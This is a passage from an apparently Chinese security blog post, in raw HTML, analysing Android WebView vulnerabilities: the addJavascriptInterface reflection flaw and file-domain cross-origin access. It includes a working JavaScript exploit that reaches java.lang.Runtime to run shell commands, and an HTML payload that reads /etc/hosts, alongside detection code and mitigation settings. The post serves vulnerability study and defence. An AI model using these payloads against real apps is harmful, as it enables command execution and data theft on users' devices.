提示：如何检测出“accessibility”和 “accessibilityTraversal”接口----设置-辅助功能-开启系统或第三方辅助服务<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>font</span> <span class="token attr-name">color</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>red</span><span class="token punctuation">></span></span>如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>font</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">//遍历window对象,的是为了找到包含getClass()的对象</span>
    <span class="token comment">//因为Android映射的JS对象也在window中，所以肯定会遍历到</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> obj <span class="token keyword">in</span> window<span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"getClass"</span> <span class="token keyword">in</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
                    window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="color:red">'</span><span class="token operator">+</span>obj<span class="token operator">+</span><span class="token string">'&lt;/span>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;br />'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token punctuation">&#125;</span>   
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>效果如下：<br><img src="https://img-blog.csdnimg.cn/c19b060b877747d38624be1e429681ef.png" alt="在这里插入图片描述" loading="lazy"><br>进一步的 EXP 程序（执行命令）：</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
   <span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">getContents</span><span class="token punctuation">(</span><span class="token parameter">inputStream</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">var</span> contents <span class="token operator">=</span> <span class="token string">""</span><span class="token operator">+</span>i<span class="token punctuation">;</span>
      <span class="token keyword">var</span> b <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span>b <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">var</span> bString <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
          contents <span class="token operator">+=</span> bString<span class="token punctuation">;</span>
          contents <span class="token operator">+=</span> <span class="token string">"\n"</span>
          b <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> contents<span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>
    
     <span class="token keyword">function</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token parameter">cmdArgs</span><span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> obj <span class="token keyword">in</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"getClass"</span> <span class="token keyword">in</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token function">alert</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">return</span> window<span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmdArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
       <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span> 
     
     <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/system/bin/sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"ls -al /sdcard"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	 document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token function">getContents</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>
<p>让 app 访问该页面，结果如下：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/b94aa34959d7436c8582411235f930fb.png" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h2><p><strong>1、使用 API Level 高于 16 的 Android 系统</strong></p>
<p>出于安全考虑，为了防止 Java 层的函数被随便调用，Google 在 4.2 版本之后，规定允许被调用的函数必须以 <code>@JavascriptInterface</code> 进行注解，所以如果某应用依赖的 API Level 为 17 或者以上，就不会受该问题的影响（注： Android 4.2 中 API Level 小于 17 的应用也会受影响。Google 官方文档使用示例如下:</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">JsObject</span> <span class="token punctuation">&#123;</span>
   <span class="token annotation punctuation">@JavascriptInterface</span>
   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string">"injectedObject"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
webView<span class="token punctuation">.</span><span class="token function">addJavascriptInterface</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">JsObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"injectedObject"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
webView<span class="token punctuation">.</span><span class="token function">loadData</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"javascript:alert(injectedObject.toString())"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>【Question】 既然 API Level 高于 16 的 Android 系统上已限制了 Java 层函数的调用，那是否可以随意给 Java 层函数添加 <code>@JavascriptInterface</code> ？</p>
<p>答案那自然是不行的……从第一部分的 Webview 示例代码中已经可以看出，如果 Webview 对外导出且加载从外部传递进来的 URL，攻击者完全可以传递恶意的 HTML 页面来调用受害者 App 供 JS 调用的 Java 接口函数（添加了<code>@JavascriptInterface</code> 注解的函数），如果这部分函数包含敏感功能、数据，那么就相当于开闸放水了……</p>
<p><strong>2、 API Level 小于 17 的 Android 系统</strong></p>
<p>建议不要使用 <code>addJavascriptInterface</code> 接口，以免带来不必要的安全隐患，如果一定要使用 addJavascriptInterface 接口:</p>
<ul>
<li>如果使用 HTTPS 协议加载 URL，应进行证书校验防止访问的页面被篡改挂马；</li>
<li>如果使用 HTTP 协议加载 URL，应进行白名单过滤、完整性校验等防止访问的页面被篡改；</li>
<li>如果加载本地 Html，应将 html 文件内置在 APK 中，以及进行对 html 页面完整性的校验。</li>
</ul>
<h1 id="跨域访问漏洞"><a href="#跨域访问漏洞" class="headerlink" title="跨域访问漏洞"></a>跨域访问漏洞</h1><p>2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)。</p>
<p>漏洞产生的原因是在 Android 应用中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。</p>
<p><strong>漏洞触发前提</strong></p>
<ol>
<li>WebView 中 <code>setAllowFileAccessFromFileURLs</code> 或 <code>setAllowUniversalAccessFromFileURLsAPI</code> 配置为 true（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false)；</li>
<li>WebView 可以直接被外部调用，并能够加载外部可控的 HTML 文件。</li>
</ol>
<p><strong>漏洞影响范围</strong></p>
<p>漏洞影响使用 WebView 控件，开启 file 域访问并且未按安全策略开发的 Android 应用APP。CNVD 对相关漏洞综合评级为“高危”。</p>
<p><strong>漏洞相关函数</strong></p>
<p>WebView 中 getSettings 类的以下几个方法会对 WebView 安全性产生影响：<br>| 方法                                       | 作用/风险                                                    | 默认策略                  |<br>| —————————————— | ———————————————————— | ————————- |<br>| setAllowFileAccess(true);                  | 设置是否允许 WebView 使用 File 协议                          | 默认设置为 true           |<br>| setAllowFileAccessFromFileURLs(true);      | 设置是否允许通过 file url 加载的 Js 代码读取其他的本地文件   | 在 Android 4.1 后默认禁止 |<br>| setAllowUniversalAccessFromFileURLs(true); | 设置是否允许通过 file url 加载的 Javascript 可以访问其他的源 (包括http、https等源) | 在 Android 4.1 后默认禁止 |<br>| setJavaScriptEnabled(true);                | 设置是否允许 WebView 使用 JavaScript                         | 默认不允许                |</p>
<h2 id="File-协议风险"><a href="#File-协议风险" class="headerlink" title="File 协议风险"></a>File 协议风险</h2><p>来看看设置  setAllowFileAccess(true) 存在的风险。</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WebviewTestActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> TAG <span class="token operator">=</span> <span class="token string">"WebviewTestActivity"</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_webview_test<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">WebView</span> webView <span class="token operator">=</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>web_view<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//设置是否允许 WebView 使用 File 协议</span>
        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//设置是否允许 WebView 使用 JavaScript</span>
        webView<span class="token punctuation">.</span><span class="token function">getSettings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        webView<span class="token punctuation">.</span><span class="token function">loadUrl</span><span class="token punctuation">(</span><span class="token string">"file:///data/local/tmp/adbapp.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>编辑 dbapp.html 如下：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
<span class="token keyword">function</span> <span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> arm <span class="token operator">=</span> <span class="token string">"file:///etc/hosts"</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>window<span class="token punctuation">.</span>XMLHttpRequest<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        xmlhttp<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token comment">//alert("status is"+xmlhttp.status);</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token operator">==</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
              console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>arm<span class="token punctuation">)</span><span class="token punctuation">;</span>
    xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">loadXMLDoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
<p>运行程序，报错如下（has been blocked by CORS policy）：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2022</span>-06-03 07:41:28.568 <span class="token number">12969</span>-12969/com.bwshen.test I/chromium: <span class="token punctuation">[</span>INFO:CONSOLE<span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token string">"Access to XMLHttpRequest at 'file:///etc/hosts' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, https."</span>, source: file:///data/local/tmp/dbapp.html <span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">)</span>
<span class="token number">2022</span>-06-03 07:41:28.568 <span class="token number">12969</span>-12969/com.bwshen.test I/chromium: <span class="token punctuation">[</span>INFO:CONSOLE<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token string">""</span>, source: file:///data/local/tmp/dbapp.html <span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span></code></pre>
<p>添加如下配置项：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">//设置是否允许通过 <span class="token function">file</span> url 加载的 Js 代码读取其他的本地文件
webView.getSettings<span class="token punctuation">(</span><span class="token punctuation">)</span>.setAllowFileAccessFromFileURLs<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>重新运行程序，已成功加载本地 html 文件并读取 <code>/etc/hosts</code> 文件：<br><img src="https://img-blog.csdnimg.cn/19170e597015448f9c65da3fa0d720e6.png" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="通用协议风险"><a href="#通用协议风险" class="headerlink" title="通用协议风险"></a>通用协议风险</h2><p>用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接。</p>
<p>将 dbapp.html 文件改成访问 <a href="https://www.freebuf.com：">https://www.freebuf.com：</a><br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/2c959444a1d94d54912a2b9a48d82add.png" alt="在这里插入图片描述" loading="lazy"><br>运行程序，效果如下图：<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/402977b376224028a0d8d4f4d5e423a8.png" alt="在这里插入图片描述" loading="lazy"><br>如果不设置 setAllowUniversalAccessFromFileURLs 的值为 true，则无法正常加载 HTTPS 页面：<br><img src="https://img-blog.csdnimg.cn/8166c181eda54074b222bfe266a69b6c.png" alt="在这里插入图片描述" loading="lazy"></p>
<h2 id="漏洞防御策略"><a href="#漏洞防御策略" class="headerlink" title="漏洞防御策略"></a>漏洞防御策略</h2><ol>
<li>检查应用是否使用了 webview 控件；</li>
<li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li>
<li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li>
</ol>
<p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p>
<ul>
<li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，<code>file:///android_asset</code> 和 <code>file:///android_res</code> 在不开启 API 的情况下也可以访问；</li>
<li>可能会更新的 HTML 文件放在 <code>/data/data/(app)</code> 目录下，避免被第三方替换或修改；</li>
<li>对 file 域请求做白名单限制时，需要对“<code>…/…/</code>”特殊情况进行处理，避免白名单被绕过。</li>
</ul>
<p><strong>最终解决方案总结：</strong></p>
<p>1）对于不需要使用 file 协议的应用，禁用 file 协议：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 禁用 file 协议；</span>
<span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token function">setAllowFileAccessFromFileURLs</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setAllowUniversalAccessFromFileURLs</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>2）对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript：</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 需要使用 file 协议时</span>
<span class="token function">setAllowFileAccess</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token comment">// 禁止 file 协议加载 JavaScript</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"file://"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文大体总结了 Android WebView 的历史高危漏洞及其当下的攻击面（接口非法访问），更多的攻击面可以参见——<a target="_blank" rel="noopener" href="http://www.wiki.yelbee.top/2020/04/30/%E5%8D%93%E6%8A%A4%E5%B9%B3%E5%8F%B0%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3/%E6%89%AB%E6%8F%8F%E5%8F%82%E6%95%B0%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E/3.6WebView%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/">WebView组件安全</a>。开发人员在使用 WebView 时应做好组件权限控制（尽量设置不可导出）、 URL 白名单校验、禁止危险协议等。</p>
<p>本文参考文章：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6936814903021797389">深入浅出JSBridge：从原理到使用</a>；</li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1394361">Android：你要的WebView与JS交互方式都在这里了</a>；</li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1394368">Android：你不知道的 WebView 使用漏洞</a>；</li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012195899/article/details/68942725">WebView远程代码执行漏洞学习并复现</a>；</li>
<li><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/5525.html">Fiddler插件编写之WebView远程代码执行检测</a>；</li>
</ol>
</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Tr0e</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/" title="Android Webview历史高危漏洞与攻击面分析">https://tr0e.github.io/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/" rel="next" title="Android内核层驱动程序UAF漏洞提权实例"><span class="post-nav-text">Android内核层驱动程序UAF漏洞提权实例</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Tr0e</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.2</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.4</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>